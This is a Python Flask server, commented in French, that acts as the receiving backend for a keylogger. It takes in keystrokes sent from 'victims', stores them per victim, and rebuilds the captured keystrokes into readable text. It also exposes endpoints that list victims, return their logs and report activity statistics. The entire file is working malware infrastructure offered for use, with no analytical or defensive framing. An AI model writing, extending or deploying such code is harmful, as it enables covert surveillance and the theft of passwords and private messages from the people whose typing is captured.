#!/usr/bin/env python3
"""
SERVEUR - API Backend
Reçoit les logs du keylogger client et les stocke
Lance avec: python3 web.py
Port: 5000 # à modifier au choix
"""

from flask import Flask, request, jsonify
from datetime import datetime
import json

app = Flask(__name__)

# Stockage en mémoire des victimes et leurs logs
victims_data = {}

def reconstruct_text(logs):
    """Reconstruit le texte à partir des logs"""
    text = ""
    for log in logs:
        key = log['key']
        if key == 'space':
            text += " "
        elif key == 'enter':
            text += "\n"
        elif key == 'backspace':
            text = text[:-1] if text else text
        elif key == 'tab':
            text += "\t"
        elif key.startswith('shift'):
            pass
        else:
            text += key
    return text

@app.route("/api/logs", methods=["POST"])
def receive_logs():
    """Reçoit les logs du keylogger"""
    try:
        data = request.json
        victim_id = data.get("victim_id")
        keys = data.get("keys", [])
        
        if not victim_id:
            return jsonify({"status": "error", "msg": "No victim_id"}), 400
        
        if victim_id not in victims_data:
            victims_data[victim_id] = {
                "victim_id": victim_id,
                "logs": [],
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "total_keys": 0
            }
        
        victims_data[victim_id]["logs"].extend(keys)
        victims_data[victim_id]["last_seen"] = datetime.now().isoformat()
        victims_data[victim_id]["total_keys"] += len(keys)
        
        print(f"[+] Logs reçus de {victim_id[:16]}... ({len(keys)} touches)")
        print(f"    Total: {victims_data[victim_id]['total_keys']} touches")
        
        return jsonify({"status": "ok", "received": len(keys)}), 200
    
    except Exception as e:
        print(f"[!] Erreur: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route("/api/victims", methods=["GET"])
def get_victims():
    """Retourne la liste des victimes"""
    try:
        victims_list = []
        for victim_id, data in victims_data.items():
            victims_list.append({
                "victim_id": victim_id,
                "first_seen": data["first_seen"],
                "last_seen": data["last_seen"],
                "total_keys": data["total_keys"]
            })
        
        print(f"[*] GET /api/victims - {len(victims_list)} victime(s)")
        return jsonify(victims_list), 200
    
    except Exception as e:
        print(f"[!] Erreur: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route("/api/victims/<victim_id>/logs", methods=["GET"])
def get_victim_logs(victim_id):
    """Retourne les logs d'une victime"""
    try:
        limit = request.args.get("limit", 100, type=int)
        
        if victim_id not in victims_data:
            return jsonify({"status": "error", "msg": "Victim not found"}), 404
        
        data = victims_data[victim_id]
        logs = data["logs"][-limit:]
        text = reconstruct_text(logs)
        
        print(f"[*] GET /api/victims/{victim_id[:16]}... - {len(logs)} logs")
        
        return jsonify({
            "victim_id": victim_id,
            "logs": logs,
            "text": text,
            "total": len(data["logs"]),
            "first_seen": data["first_seen"],
            "last_seen": data["last_seen"]
        }), 200
    
    except Exception as e:
        print(f"[!] Erreur: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route("/api/stats", methods=["GET"])
def get_stats():
    """Retourne les statistiques"""
    try:
        total_victims = len(victims_data)
        active_victims = sum(1 for v in victims_data.values() 
                           if (datetime.now() - datetime.fromisoformat(v["last_seen"])).total_seconds() < 60)
        total_keys = sum(v["total_keys"] for v in victims_data.values())
        
        print(f"[*] GET /api/stats")
        
        return jsonify({
            "total_victims": total_victims,
            "active_victims": active_victims,
            "total_keys": total_keys,
            "timestamp": datetime.now().isoformat()
        }), 200
    
    except Exception as e:
        print(f"[!] Erreur: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route("/", methods=["GET"])
def index():
    """Page d'accueil"""
    return jsonify({
        "status": "running",
        "endpoints": [
            "POST /api/logs",
            "GET /api/victims",
            "GET /api/victims/<victim_id>/logs",
            "GET /api/stats"
        ]
    }), 200

if __name__ == "__main__":
    print("[*] Serveur API Keylogger démarré...")
    print("[*] PORT 5000 - API Backend")
    print("[*] Écoute sur http://0.0.0.0:5000")
    print("[*] En attente de connexions...")
    app.run(host="0.0.0.0", port=5000, debug=False) 
